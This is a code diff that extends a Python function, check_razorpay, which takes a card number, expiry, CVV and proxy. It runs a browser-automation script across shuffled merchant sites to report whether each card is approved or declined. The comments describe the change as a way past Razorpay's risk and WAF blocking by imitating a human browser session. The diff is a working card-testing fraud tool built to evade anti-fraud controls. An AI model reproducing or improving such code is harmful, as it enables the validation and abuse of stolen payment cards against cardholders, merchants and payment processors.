@@ -386,6 +386,38 @@ async def check_razorpay(cc: str, mm: str, yy: str, cvv: str, proxy: str = None,
             }
         random.shuffle(candidate_sites)
 
+        # ── 0. Browser walker first — the aiohttp create/ajax gets blocked by
+        # razorpay's risk/WAF layer (403) because the shield payload is
+        # incomplete; a real browser session passes it. pay.py walks the page
+        # like a human and returns the verdict from the gateway's own response.
+        # SITE_FAIL/ERROR per site → try next; verdict → return. ──
+        pay_py = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pay.py")
+        for site in candidate_sites:
+            args = {"site": site, "card": cc, "mm": mm, "yy": str(year_full), "cvv": cvv,
+                    "proxy_server": None, "proxy_user": None, "proxy_pass": None}
+            if proxy:
+                u = urlsplit(proxy if proxy.startswith("http") else "http://" + proxy)
+                args["proxy_server"] = f"{u.scheme or 'http'}://{u.hostname}:{u.port or 8080}"
+                if u.username:
+                    args["proxy_user"] = u.username
+                    args["proxy_pass"] = u.password or ""
+            try:
+                proc = await asyncio.create_subprocess_exec(
+                    os.environ.get("RZ_CAPTCHA_PYTHON", sys.executable), pay_py, json.dumps(args),
+                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.DEVNULL,
+                )
+                out_b, _ = await asyncio.wait_for(proc.communicate(), timeout=110)
+                data = json.loads(out_b.decode(errors="ignore"))
+            except Exception:
+                continue
+            st = str(data.get("status", "")).upper()
+            if st in ("APPROVED", "DECLINED", "REQUIRES_ACTION"):
+                resp_text = str(data.get("response") or "Payment failed")
+                result.update(status=st, message=resp_text, response=resp_text,
+                              raw_response=str(data.get("raw", ""))[:4000])
+                return result
+            # SITE_FAIL / ERROR → next candidate site
+
         last_fail = ""
         for site in candidate_sites:
             try:
